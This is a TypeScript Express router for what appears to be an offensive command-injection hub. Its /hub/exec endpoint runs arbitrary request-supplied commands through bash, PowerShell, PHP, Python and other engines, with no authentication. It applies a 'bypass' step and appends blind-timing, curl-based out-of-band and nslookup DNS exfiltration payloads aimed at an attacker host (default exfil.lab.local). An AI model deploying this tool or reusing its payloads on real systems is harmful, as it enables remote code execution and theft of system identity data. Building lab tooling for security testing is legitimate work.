import { Router, type IRouter, type Request, type Response } from "express";
import { execSync } from "child_process";
import { applyQuantumBypass } from "../lib/bypassEngine.js";
import { logInjection } from "../lib/injectionLogger.js";
import { runBash } from "../engines/bash.js";
import { runNode } from "../engines/node.js";
import { runPython } from "../engines/python.js";
import { runPhp } from "../engines/php.js";
import { runJava } from "../engines/java.js";
import { runCpp } from "../engines/cpp.js";
import { runPowershell } from "../engines/powershell.js";

const router: IRouter = Router();

function checkBin(cmd: string): boolean {
  try {
    execSync(cmd, { stdio: "ignore", timeout: 2000 });
    return true;
  } catch {
    return false;
  }
}

router.get("/hub/health", (_req: Request, res: Response) => {
  res.json({
    status: "online",
    version: "4.0.0",
    timestamp: new Date().toISOString(),
    engines: ["php", "node", "python", "java", "cpp", "powershell", "bash"],
  });
});

router.get("/hub/engines", (_req: Request, res: Response) => {
  res.json({
    php: checkBin("php --version"),
    node: true,
    python: checkBin("python3 --version"),
    java: checkBin("java -version"),
    cpp: checkBin("gcc --version"),
    powershell: checkBin("pwsh --version") || checkBin("powershell -v"),
    bash: true,
  });
});

router.post("/hub/exec", async (req: Request, res: Response) => {
  const start = Date.now();
  const { cmd, engine = "node/exec", mode = "classic", attacker = "exfil.lab.local" } = req.body as {
    cmd?: string;
    engine?: string;
    mode?: string;
    attacker?: string;
  };

  if (!cmd || typeof cmd !== "string") {
    res.status(400).json({ error: "cmd is required" });
    return;
  }

  let processed = applyQuantumBypass(cmd, mode);
  if (mode === "blind") processed += " && sleep 6 || echo fast";
  if (mode === "oob") processed += ` && curl -s http://${attacker}/?d=$(whoami)`;
  if (mode === "quantum") processed += " && nslookup $(id).exfil.lab.local";

  const [lang, func = "exec"] = engine.split("/");

  let output = "Engine executed";
  try {
    if (lang === "php") output = runPhp(processed, func);
    else if (lang === "node") output = await runNode(processed, func);
    else if (lang === "python") output = runPython(processed, func);
    else if (lang === "java") output = runJava(processed, func);
    else if (lang === "cpp") output = runCpp(processed, func);
    else if (lang === "bash") output = runBash(processed);
    else if (lang === "powershell") output = runPowershell(processed);
    else {
      res.status(400).json({ error: `Unknown engine: ${lang}` });
      return;
    }
  } catch (e: unknown) {
    output = `[Engine Error] ${(e as Error).message}`;
  }

  const elapsed = Date.now() - start;
  logInjection(cmd, engine, mode, elapsed);

  res.json({
    output: typeof output === "string" ? output : JSON.stringify(output),
    engine,
    mode,
    elapsed,
  });
});

export default router;
